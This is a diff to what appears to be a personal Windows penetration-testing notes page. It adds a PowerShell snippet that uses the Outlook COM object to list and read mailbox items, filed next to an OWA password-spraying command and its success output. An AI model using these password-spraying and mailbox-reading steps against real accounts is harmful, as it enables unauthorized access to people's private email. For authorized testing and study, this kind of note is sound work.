@@ -61,6 +61,7 @@ A place for me to store my notes/tricks for Windows Based Systems.
       * <a href="#-exchange-mailbox-post-compromise">Exchange Mailbox Post-Compromise</a>
       * <a href="#-crackmapexec">CrackMapExec</a>
       * <a href="#-mail-sniper">Mail Sniper</a>
+      * <a href="#-read-exchange-emails-with-powershell">Read Exchange Emails with PowerShell</a>
       * <a href="#-kerberos-stuff">Kerberos Stuff</a>
       * <a href="#-mssql-exploiting-powerupsql">MSSQL Exploiting (PowerUpSQL)</a>
       * <a href="#-malicious-macro-with-msbuild">Malicious Macro with MSBuild</a>
@@ -887,6 +888,20 @@ Invoke-PasswordSprayOWA -ExchHostname m0chanAD.local -userlist harvestedUsers.tx
 [*] SUCCESS! User:m0chan:Summer2019
 
 Lmao, you really think Id use the pass Summer2019?
+```
+
+
+
+#### [](#header-4) Read Exchange Emails with PowerShell
+
+```powershell
+$outlook = New-Object -ComObject outlook.application
+$olFolders ="Microsoft.Office.Interop.Outlook.OlDefaultFolders" -as [type]
+$namespace = $Outlook.GetNameSpace("MAPI")
+$inbox = $namespace.GetDefaultFolder($olFolders::olFolderInbox)
+$inbox.items.count
+$inbox.items
+$inbox.items.GetLast()
 ```
 
 
